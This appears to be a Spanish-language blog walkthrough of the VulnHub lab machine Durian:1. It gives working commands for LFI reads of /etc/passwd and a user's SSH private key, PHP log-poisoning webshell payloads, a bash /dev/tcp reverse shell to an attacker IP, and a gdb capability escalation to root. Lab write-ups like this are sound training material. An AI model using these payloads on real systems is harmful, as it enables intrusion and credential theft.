---
layout: single
title: Durian:1 - VulnHub
excerpt: " Difficulty: Hard Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox) Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root). "
date: 2022-11-10
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-durian/durian.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:  
  - lfi
  - burpsuite
  - poisoning
  - capabilities
  - gdb
---

Difficulty: Hard Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox) Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).

# Summary
- IP: 192.168.0.115
- Ports: 22,80,7080,8088
- OS: Linux (Debian Buster)
- Services & Applications:
	-  22 -> OpenSSH 7.9p1 Debian 10+deb10u2
	-  80 -> Apache httpd 2.4.38
	-  7080-> LiteSpeed
	-  8088 -> LiteSpeed

# Recon

- Escaneo básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.129.26 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$sudo nmap -p21,80,7080,8088 -sCV 10.10.129.26 -oN targeted
```

- Escaneo básico de página web:

```bash
$nmap --script http-enum -p80 192.168.0.112 -oN webScan
```

- Analizamos el directorio cgi-data y encontramos un recuerso php, lo analizamos con wfuzz en búsqueda de algún parámetro que apunte a archivos del sistema (LFI) y encontramos que el parámetro "file" es vulnerable.

- Vemos el archivo /etc/passwd y enumeramos los usuarios que tienen una bash.


# Enumeración básica de LFI:

```bash
curl -s -X GET "http://192.168.0.115/cgi-data/getImage.php?file=/proc/net/tcp" | tail -n 4

curl -s -X GET "http://192.168.0.115/cgi-data/getImage.php?file=/proc/net/tcp" | tail -n 4  |  awk '{print $2}'
```

- Nos encontramos con puertos abiertos dentro de la máquina en hexadecimal (Últimos 4 caracteres de cada fila) transformarlos en decimal:

```bash
$echo $((16#VALOR HEXADECIMAL))
```

- Encontramos el puerto 3306 abierto (Mysql)

- Enumeramos procesos:

```bash
$curl -s -X GET "http://192.168.0.115/cgi-data/getImage.php?file=/proc/sched_debug"
```

- Enumeramos usuarios:

```bash
curl -s -X GET "http://192.168.0.115/cgi-data/getImage.php?file=/etc/passwd" | grep "sh$"
```

- Enumerar clave privada de usuario encontrado:

```bash
$curl -s -X GET "http://192.168.0.115/cgi-data/getImage.php?file=/home/durian/.ssh/id_rsa"
```

- Verificar que exista vulnerabilidad de log poisoning listando los recursos de apache, mail ssh:

```bash
$curl -s -X GET "http://192.168.0.115/cgi-data/getImage.php?file=/var/log/apache2/access.log"

$curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios"

$curl -s -X GET "http://192.168.0.115/cgi-data/getImage.php?file=/var/log/auth.log"
```


- Al no obtener información relevante, tratamos de derivar el LFI a RCE con burpsuite:
- Abrimos burpsuite y nos vamos al recurso mediante el navegador para interceptar desde el proxy:

```
(536=proceso de apache visto en el recurso sched_debug)
http://192.168.0.115/cgi-data/getImage.php?file=/proc/536/cmdline
```

- Interceptar peticion en burpsuite y mandarla al repeater (Ctrl+R):

- apuntar a:

```
http://192.168.0.115/cgi-data/getImage.php?file=/proc/self/fd/0
```

y mandarla al Intruder ( Ctrl+i ) para realizar ataque:

- Seleccionar ataque de tipo Snipper
- Seleccionar "clear" para limpiar
- Seleccionar el 0 y click en ADD.
- En la pestaña payloads seleccionar de tipo numérico (numbers)
- Indicar desde 1 hasta 30 de 1 en 1
- Click en start attack
- Examinar recursos:
- En los recursos con mayor número de respuestas pueden tratarse de logs, en este caso en la ruta "8" vemos demasiadas respuestas, por lo que podría ser el log de apache: (reiniciar máquina víctima para comprobar que se haya limpiado el supuesto log de apache)
- Seleccionar la petición de la ruta "8" y mandarla al repeater (Ctrl+r)

```
http://192.168.0.115/cgi-data/getImage.php?file=/proc/self/fd/8
```

- Repetimos la petición y vemos que si se trata del log de apache ya que registra las peticiones que se hacen a la IP de la máquina
- Ahora inyectamos código PHP en el user-agent ya que estamos apuntando a un archivo php (getImage) y el código lo debería interpretar:
- Hacemos una petición cualquier a la web y capturamos con Burpsuite:
- Modificamos en el repeater el user-agent por el código PHP y le damos send:

```
<?php system('whoami'); ?>
```

- Revisamos de nuevo el log apache y veremos el código PHP interpretado.
- Hacemos que por un parámetro "cmd" podamos ejecutar los comandos que queramos desde el link:

```
<?php system($_GET['cmd']); ?>
```

- Ahora desde el link (como ya existe un interrogante agregamos un ampersan) podemos ejecutar comandos:

view-source:http://192.168.0.116/cgi-data/getImage.php?file=/proc/self/fd/8&cmd=pwd

- Creamos una reverse shell básica:

view-source:http://192.168.0.116/cgi-data/getImage.php?file=/proc/self/fd/8&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.106/443 0>%261"

- Accedemos, hacemos tratamiento de la tty y obtenemos la flag de usuario:

#  USER FLAG: ************************


# ESCALANDO PRIVILEGIOS:

- Con sudo -l vemos que tenemos permitido ejecutar dos binarios como root "shutdown" y "ping", buscamos en gtfobins pero no encontramos nada, se trata de una rabbit hole.
- Buscamos por capabilities:

```bash
getcap -r / 2>/dev/null
```

- Obtenemos "gdb" con capabilities, buscamos en gtfobins y si que hay forma de ganar acceso a una bash root:

If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

-   This requires that GDB is compiled with Python support.
    
    ```bash
    cp $(which gdb) .
    sudo setcap cap_setuid+ep gdb
    
    ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
    ```

- Ejecutamos el comando y accedemos como root.

#  ROOT FLAG: SunCSR_Team.af6d45da1f1181347b9e2139f23c6a5b
